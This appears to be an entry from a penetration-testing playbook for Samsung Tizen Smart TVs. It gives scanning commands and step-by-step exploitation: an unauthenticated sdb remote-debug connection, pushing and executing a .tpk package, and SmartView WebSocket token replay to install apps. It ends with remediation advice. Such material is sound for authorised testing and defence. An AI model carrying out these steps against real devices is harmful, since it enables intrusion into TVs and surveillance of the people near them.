---
id: tizen_smarttv
technology: "Samsung Tizen Smart TV"
domain: IoT
category: iot
transport: ip
safety_class: intrusive
severity: high
life_safety: false
match:
  ports: [26101, 8001, 8002]
  banners: ["Tizen", "Samsung", "SmartView", "sdb", "Smart Development Bridge"]
  markers: ["tizen", "samsung", "smartview", "sdb", "/api/v2/", "device_name", "wssecured", "Samsung Smart TV"]
quick_wins:
  - { cmd: "nmap -Pn -sV -p26101,8001,8002 --script=banner {host}", safety: safe, note: "Service enumeration of the three Tizen control surfaces — sdb remote-debug (26101), SmartView WebSocket API plain (8001) and TLS (8002); confirms a Samsung Tizen panel and whether remote debug is exposed." }
  - { cmd: "curl -sk http://{host}:8001/api/v2/ 2>/dev/null | python3 -m json.tool | head -40", safety: safe, note: "SmartView REST device descriptor — leaks model, firmware, device_name, wifiMac, and whether the WS API is token-gated (read-only, no app control)." }
  - { cmd: "nmap -Pn -sU -p1900 --script upnp-info {host}", safety: safe, note: "DIAL / UPnP SSDP discovery — enumerates the TV's DIAL application list and rootDevice descriptor URL used to launch installed apps (Netflix, YouTube) read-only." }
  - { cmd: "sdb connect {host}:26101 && sdb devices && sdb capability", safety: intrusive, note: "Smart Development Bridge connect + capability probe. Toolchain: sdb ships with Tizen Studio (Android adb is NOT wire-compatible with sdb). On an unlocked/dev panel this returns a device handle with zero auth — confirm scope authorisation before running; it registers the tester as a debug host on the TV." }
  - { cmd: "sdb -s {host}:26101 push ./probe.tpk /home/owner/share/tmp/ && sdb -s {host}:26101 shell 0 execute org.example.probe", safety: intrusive, note: "Highest-probability foothold: push a signed debug .tpk then launch it = arbitrary code execution as the owner app sandbox. Requires a valid author/distributor signing cert; only run under explicit written authorisation — this installs and executes code on the target." }
  - { cmd: "python3 samsung_ws_probe.py --host {host} --port 8002 --name argus-probe --tls", safety: intrusive, note: "SmartView WebSocket handshake to wss://{host}:8002/api/v2/channels/samsung.remote.control — triggers the on-screen ALLOW/DENY pairing prompt and, once tokened, exposes the app-install/launch API. Active: it is visible to anyone at the TV; confirm scope first." }
references:
  - "CVE-2019-12295 (Samsung Tizen remote-debug / sdb exposure)"
  - "SSD-Advisory Samsung Tizen sdb 26101 unauthenticated remote debug"
  - "Samsung SmartView / samsung.remote.control WebSocket app-control advisory"
  - "DIAL protocol UPnP app-launch abuse advisory"
mitre: "T1190"
---
# Samsung Tizen Smart TV

Tizen is Samsung's Linux-based operating system for Smart TVs, soundbars, and signage displays,
deployed across hundreds of millions of consumer and commercial panels worldwide. Beyond consumer
living rooms it appears in corporate lobbies, hospital rooms, conference spaces, and digital-signage
fleets — often on the same VLAN as trusted infrastructure and rarely patched or monitored. Tizen
exposes several network control surfaces: the Smart Development Bridge (sdb) remote-debug service on
TCP 26101, the SmartView / SmartThings WebSocket application API on TCP 8001 (plain) and 8002 (TLS),
and DIAL/UPnP app-launch discovery over SSDP (UDP 1900).

**Why it matters.** The sdb service on 26101 is Samsung's equivalent of Android's adb, but on many
panels — especially those left in or shipped with developer mode enabled, or signage units — it
accepts connections with **no authentication**. An attacker who can reach 26101 can register as a
debug host, push a signed Tizen package (`.tpk`), and launch it, obtaining code execution inside the
owner application sandbox with access to the local filesystem, network position, and TV peripherals
(camera/mic on equipped models). The SmartView WebSocket API on 8001/8002 provides a second path:
after a one-time on-screen pairing prompt it yields a persistent token that authorizes remote key
injection and, on some firmware, app installation and launch. DIAL/UPnP rounds out the surface with
unauthenticated enumeration and launch of registered apps. Critically, **sdb is not adb** — Tizen
uses its own protocol and the `sdb` client bundled with Tizen Studio; pointing `adb` at 26101 fails.

**Safe-first testing.** Start with the passive `nmap` service sweep of 26101/8001/8002 and the
SmartView `/api/v2/` descriptor read to confirm the panel model, firmware, and whether remote debug
is even listening — none of these touch the device state or raise an on-screen prompt. Use DIAL/UPnP
discovery to inventory installed apps. Only then, under explicit written scope authorisation, connect
with `sdb` and run a capability probe; the SmartView WS handshake and any `.tpk` push are visibly
intrusive (they raise on-screen prompts and install code) and must never run without sign-off.

## Exploitation

Highest-probability foothold — sdb remote debug (TCP 26101):

1. **Confirm exposure.** `nmap -Pn -p26101 {host}` — an open 26101 on a Samsung panel almost always
   means remote debug is reachable. sdb requires the Tizen Studio `sdb` binary (adb will not work).
2. **Connect (unauthenticated on vulnerable panels).**
   `sdb connect {host}:26101` then `sdb devices` — a listed device handle with no auth prompt
   confirms the foothold. Run `sdb capability` to read the target's architecture, sandbox, and
   installed-package permissions.
3. **Push + execute a signed debug app = code execution.**
   `sdb -s {host}:26101 push ./probe.tpk /home/owner/share/tmp/` then
   `sdb -s {host}:26101 shell 0 vd_appinstall org.example.probe /home/owner/share/tmp/probe.tpk`
   and launch with `sdb -s {host}:26101 shell 0 execute org.example.probe`. The `.tpk` must carry a
   valid author/distributor certificate (a self-issued Samsung dev cert is sufficient on dev-mode
   panels). Execution lands inside the owner application sandbox; `sdb shell` gives an interactive
   prompt for further enumeration of the local network segment and TV peripherals.

Alternative foothold — SmartView WebSocket app API (TCP 8001/8002):

1. Open `ws://{host}:8001/api/v2/channels/samsung.remote.control` (or TLS on 8002:
   `wss://{host}:8002/...`) with a `name` parameter (base64) — this raises an ALLOW/DENY prompt on
   the TV screen.
2. Once a human at the panel accepts (or on firmware that auto-accepts trusted-network clients), the
   server returns a persistent `token`. Replay the token on reconnect to skip the prompt.
3. With a valid token, send `ms.remote.control` key events and, on supporting firmware,
   `ed.installApp` / DIAL launch messages to install or start an attacker-chosen application —
   pivoting to persistence without needing the signing toolchain.

**Remediation.** Disable Developer Mode on every panel (Apps → Developer mode → Off) so sdb stops
listening on 26101; where dev mode is required, bind it to a specific dev-host IP. Segment all TVs
and signage onto an isolated VLAN with no route to management or user networks, and firewall
26101/8001/8002 from all but explicitly authorised hosts. Keep Tizen firmware current via automatic
updates. Remove stale SmartView pairing tokens, and physically confirm any pairing prompt before
accepting. For signage fleets, use Samsung's MDM (Knox/MagicINFO) enrollment rather than leaving
remote debug open.
